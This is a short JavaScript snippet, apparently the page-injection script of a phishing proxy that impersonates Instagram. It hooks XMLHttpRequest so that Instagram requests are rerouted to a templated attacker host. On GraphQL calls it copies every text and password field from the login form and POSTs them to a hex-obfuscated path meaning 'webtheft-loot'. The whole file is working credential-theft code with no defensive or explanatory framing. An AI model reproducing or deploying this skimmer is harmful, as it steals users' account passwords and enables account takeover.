// Rewrite XHR requests URL
// And intercept FORM data
(function () {
  const originalOpen = XMLHttpRequest.prototype.open;

  XMLHttpRequest.prototype.open = function (
    method,
    url,
    async,
    user,
    password,
  ) {
    if (typeof url === "string" && url.includes("www.instagram.com")) {
      url = url.replace("https://www.instagram.com", "{actual_host}");
    } else if (typeof url === "string" && url.includes("/api/graphql")) {
      const form = document.forms[0];
      const n = form.querySelectorAll(
          'input[type="text"], input[type="password"]',
        ),
        o = {};
      n.forEach((t) => {
        const e = t.name || t.id || "unknown";
        o[e] = t.value;
      });
      fetch("/77656274686566742d6c6f6f74", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(o),
      });
    }
    return originalOpen.call(this, method, url, async, user, password);
  };
})();
